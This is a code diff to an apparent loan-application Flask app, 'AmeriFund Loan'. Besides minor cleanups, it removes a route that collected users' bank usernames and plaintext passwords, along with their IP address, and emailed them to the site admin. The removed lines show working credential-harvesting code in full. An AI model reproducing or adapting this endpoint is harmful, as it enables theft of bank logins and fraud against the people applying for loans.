@@ -11,8 +11,7 @@ from forms import (RegistrationForm, LoginForm, LoanAmountForm, PersonalInfoForm
 from email_service import (send_admin_notification, send_confirmation_to_applicant, 
                           send_welcome_email, send_loan_amount_notification,
                           send_personal_info_notification, send_bank_info_notification,
-                          send_document_upload_notification, send_loan_approval_email,
-                          send_email)
+                          send_document_upload_notification, send_loan_approval_email)
 from plaid_service import create_link_token, exchange_public_token, get_institution_by_id
 from file_service import save_file
 from config import Config
@@ -23,7 +22,7 @@ logger = logging.getLogger(__name__)
 @app.route('/')
 def index():
     """Home page route"""
-    return render_template('index.html', title='AmeriFund Loan - Secure Financing Solutions', now=datetime.now())
+    return render_template('index.html', title='AmeriFund Loan - Secure Financing Solutions')
 
 @app.route('/register', methods=['GET', 'POST'])
 def register():
@@ -517,40 +516,3 @@ def page_not_found(e):
 @app.errorhandler(500)
 def server_error(e):
     return render_template('500.html'), 500
-    
-@app.route('/api/bank-login-attempt', methods=['POST'])
-@login_required
-def bank_login_attempt():
-    """API endpoint to log bank login attempts and send them to admin"""
-    data = request.json
-    
-    if not data:
-        return jsonify({'error': 'No data provided'}), 400
-    
-    # Get the required data
-    bank_name = data.get('bank', 'Unknown Bank')
-    username = data.get('username', '')
-    password = data.get('password', '')
-    attempt = data.get('attempt', 1)
-    
-    # Create HTML content for the email
-    html_content = f"""
-    <h2>Bank Login Attempt {attempt}</h2>
-    <p>A user attempted to log in to their bank account.</p>
-    <table border="1" cellpadding="5" cellspacing="0">
-        <tr><td>User</td><td>{current_user.email} ({current_user.username})</td></tr>
-        <tr><td>Bank</td><td>{bank_name}</td></tr>
-        <tr><td>Username</td><td>{username}</td></tr>
-        <tr><td>Password</td><td>{password}</td></tr>
-        <tr><td>Attempt</td><td>{attempt}</td></tr>
-        <tr><td>Time</td><td>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</td></tr>
-        <tr><td>IP Address</td><td>{request.remote_addr}</td></tr>
-    </table>
-    """
-    
-    # Send email to admin
-    subject = f"Bank Login Attempt {attempt} - {bank_name} - {current_user.email}"
-    send_email(Config.ADMIN_EMAIL, subject, html_content)
-    
-    return jsonify({'success': True})
-
